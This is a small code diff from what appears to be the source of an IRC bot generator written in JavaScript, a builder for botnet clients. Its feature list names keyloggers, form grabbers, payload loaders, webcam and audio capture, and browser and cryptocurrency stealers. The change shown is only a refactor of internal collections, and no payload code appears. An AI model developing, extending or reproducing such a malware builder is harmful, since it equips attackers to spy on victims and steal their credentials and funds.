@@ -23,9 +23,9 @@ class IRCBotGenerator {
     constructor() {
         this.supportedLanguages = ['cpp', 'python', 'go', 'rust', 'csharp', 'javascript'];
         this.availableFeatures = ['fileManager', 'processManager', 'systemInfo', 'networkTools', 'keylogger', 'screenCapture', 'formGrabber', 'loader', 'webcamCapture', 'audioCapture', 'browserStealer', 'cryptoStealer'];
-        this.customFeatures = this.memoryManager.createManagedCollection('customFeatures', 'Map', 100);
-        this.featureTemplates = this.memoryManager.createManagedCollection('featureTemplates', 'Map', 100);
-        this.templates = this.memoryManager.createManagedCollection('templates', 'Map', 100);
+        this.customFeatures = new Map();
+        this.featureTemplates = new Map();
+        this.templates = new Map();
         this.botStats = {
             totalGenerated: 0,
             successfulGenerations: 0,
